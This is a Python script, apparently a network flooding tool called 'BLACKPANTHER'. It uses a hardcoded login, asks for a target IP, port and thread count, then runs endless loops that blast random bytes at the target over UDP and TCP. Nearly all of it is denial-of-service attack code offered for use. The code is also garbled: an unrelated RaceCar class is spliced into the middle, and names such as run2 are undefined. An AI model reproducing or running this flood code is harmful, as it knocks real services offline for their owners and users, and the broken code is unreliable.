# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

attemps = 0
os.system("clear")
print("")
print("\033[95m        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @  \033[0m")
print("\033[95m        @         @  @      @         @   @        @     @    \033[0m")
print("\033[95m        @         @  @       @       @   @         @   @      \033[0m")
print("\033[31m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
print("\033[31m        @         @  @          @ @       @        @     @    \033[0m")
print("\033[31m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
print("")     
print("\033[91m      @ @ @      @ @   @     @ @ @ @ @ @     @  @ @ @  @ @ @    \033[0m")
print("\033[91m            @  @     @ @ @   @    @    @     @  @      @     @  \033[0m")
print("\033[94m      @ @ @    @ @ @ @ @   @ @    @    @ @ @ @  @ @ @  @ @ @    \033[0m")
print("\033[94m      @        @     @ @     @    @    @     @  @ @ @  @     @  \033[0m")
print("")
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")

while attemps < 100:
    username = input("\033[95mEnter your username: \033[0m")
    password = input("\033[94mEnter your password: \033[0m")

    if username == 'n0lk0ma' and password == 'n0lk0ma':
        print("\033[33mHai...kamu berhasil login di BLACKPANTHER!!\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")


ip = str(input("\033[96m Target IP : \033[0m"))
port = int(input("\033[92m Target Port : \033[0m"))
choice = str(input("\033[31m (y/n) : \033[0m"))
times = int(input(" Time : "))
threads = int(input("\033[36m Threads : \033[0m"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i + "\033[32mלתקוף את פרוטוקול הנתונים של המשתמש\033[0m")
		except:
			print("[-] \033[97mError!!!\033[0m")


class RaceCar:
    def __init__(self,color,fuel_remaining,**kwargs):
        self.color=color
        self.fuel_remaining=fuel_remaining
        self.laps = 0
        for key,value in kwargs.items():
            setattr(self,key,value)

    def run_lap(self,length):
        self.length = length
        self.fuel_remaining = self.fuel_remaining - (self.length * 0.125)
        self.laps = self.laps + 1
        data = random._urandom(999)
	while true:
		try:
		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
		except:
		        s.close()
		        print("[-] \033[31mError!!!\033[0m")
            

def run3():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i + " \033[95mSending Massage\033[0m")
		except:
			s.close()
			print("[-] \033[31mMaybe down...!\033[0m")
            
  
def run4():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
		except:
			s.close()
			print("[-] \033[31mError!!!\033[0m"])


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()


